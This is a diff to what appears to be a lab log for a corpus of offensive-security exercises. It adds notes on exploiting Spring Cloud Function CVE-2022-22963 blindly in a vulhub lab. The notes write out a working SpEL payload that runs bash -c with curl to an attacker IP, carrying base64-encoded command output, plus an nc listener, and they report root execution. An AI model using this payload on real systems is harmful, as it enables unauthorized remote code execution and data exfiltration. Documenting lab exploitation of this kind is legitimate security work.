@@ -716,6 +716,30 @@ genuinely large bonus haul: the target CVE itself, unauthenticated-access
 confirmation, a live `redis-info` dump, and three further real 2025 CVEs
 this same image is also vulnerable to.
 
+### `spring_spel_rce_chain`: fourth grind-through target, the first genuinely BLIND one
+
+`spring/CVE-2022-22963` (Spring Cloud Function SpEL injection via the
+`spring.cloud.function.routing-expression` header). Unlike
+`es_groovy_rce_chain`/`redis_lua_rce_chain`, this exploited service never
+reflects anything: confirmed live that `Runtime.exec(...)` returns to the
+caller immediately (no blocking on the child process), so neither the
+HTTP response body (a generic 500 error every time) nor response timing
+(tested directly -- a `sleep 5` payload came back in ~0.01s, identical to
+a no-op payload) give any signal back. The real technique, confirmed
+live end to end: route through `bash -c` (`exec(new
+String[]{"bash","-c","curl http://<attacker-ip>:<port>/$(<cmd>|base64)"})`)
+so the TARGET's own shell evaluates `$(...)`, and have it call back to a
+plain `nc -lnp <port>` listener on `kali-agent-box` itself, carrying the
+base64'd command output in the callback's own URL path -- `id` came back
+as `uid=0(root) gid=0(root) groups=0(root)`. The listener's own IP isn't
+hardcoded (kali-agent-box gets a fresh IP on every new vulhub network,
+same as the target); it's derived at run time via `ip route get
+{target}`, a general technique worth reusing for any future recipe
+needing a reachable callback address. nuclei's real tag for this CVE is
+`springcloud`, not `spring` (checked via `grep tags:` before guessing).
+searchsploit came back "No Results" for this one -- an honest negative,
+not a bug (see the template's own comment).
+
 ## Known gaps
 
 - **Severe tool-usage imbalance in the CORPUS (the merged/exported training
